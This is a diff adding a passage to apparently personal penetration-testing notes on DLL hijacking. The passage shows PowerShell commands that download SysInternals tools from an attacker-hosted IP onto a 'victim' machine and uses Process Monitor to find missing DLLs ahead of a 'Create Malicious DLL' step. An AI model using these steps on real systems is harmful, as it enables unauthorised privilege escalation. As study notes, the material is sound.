@@ -32,6 +32,32 @@ Once we've enumerated the installed service and found one of interest, we can vi
 | R    | Read-only access        |
 | W    | Write-only access       |
 
+
+
+
+
+## Enumerating DLL's ProcessExplorer
+
+If we have access to RDP, we can use SysInternals' ProcessExplorer to quickly find Dlls.
+
+{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer" %}
+
+### Download ProcessExplorer & ProcessMonitor to Victim
+
+```powershell
+PS> iwr -uri http://192.168.45.246:8000/procexp64.exe -OutFile procexp64.exe
+```
+
+```powershell
+PS> iwr -uri http://192.168.45.246:8000/Procmon64.exe -OutFile Procmon64.exe
+```
+
+###
+
+### Search for missing DLL's
+
+Launch Process Monitor and set a filter for result “<mark style="color:red;">**NAME NOT FOUND**</mark>”.
+
 ##
 
 ## Create Malicious DLL
